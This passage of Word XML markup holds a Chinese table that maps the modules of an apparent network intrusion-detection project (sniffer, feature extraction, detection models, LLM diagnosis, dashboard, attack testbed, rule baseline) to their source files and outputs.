        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1581193E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="58AAFC58">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>对应源文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F63BAE8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>关键产出</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0224C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2145C149">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6DF62A70">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>数据包嗅探与协议解析</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="24AB2A08">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>probe/sniffer.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0191C17A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>双向会话表、pcap 与特征 CSV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3978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2726B135">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F0F6903">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>流量特征工程</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4AFFEB83">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>probe/features.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="103E7528">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>78 维特征向量、feature_schema.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3FFF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453F2ED2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69A8101E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>小模型攻击检测</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="027D8FC5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>center/inference.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="26A4FD36">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Detector：批推理 + Top-k 证据打包</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="42ACB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22DD5D7B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="23778FBD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>大模型自然语言诊断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="671B6CC5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>llm/prompts.py、llm/client.py、llm/schema.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="345CE690">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>五段式报告、多轮追问、模板降级</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="219F1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310CE867">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15D857D4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Web 可视化看板</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="146728BB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>dashboard/app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="678B5435">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>四个标签页与自动刷新</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6BA1A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677D1A13">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31FB4AA9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>中心服务与边缘通信</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5EFEC0E8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>center/main.py、center/database.py、probe/reporter.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F207941">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>八个路由、四张表、上报客户端</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="67E5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6F2B94AB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="728E9C4E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>攻击复现实验台</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3AFAEFE1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>attack/*.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69BE89EC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>三支攻击脚本与安全护栏</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="28DC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38B74FC8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5F6420E4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>模型对比实验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18D0A2D0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>models/train.py、models/hybrid_forest.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31836486">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>comparison.json、best_model.pkl</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="596A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612E958F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="065A7361">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>RAG 协议知识库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7FA9B06C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>llm/rag.py、data/rag/chunks.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0BD9E853">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>12 条知识、BM25 检索</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="32E8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4" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="21305978">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D82187E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>双探针联动演示</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="71B59F79">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>（贯穿 M1—M6）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3DD0C0D6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>设计文档，未联调</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6680E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794" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0536C1F0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1ADDAB15">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>阈值规则引擎基线</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="76C8522B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>center/rules.py、tools/rules_baseline.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="005711F8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>规则引擎、rules_baseline.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="251CB6D7">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35DF4EFD">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
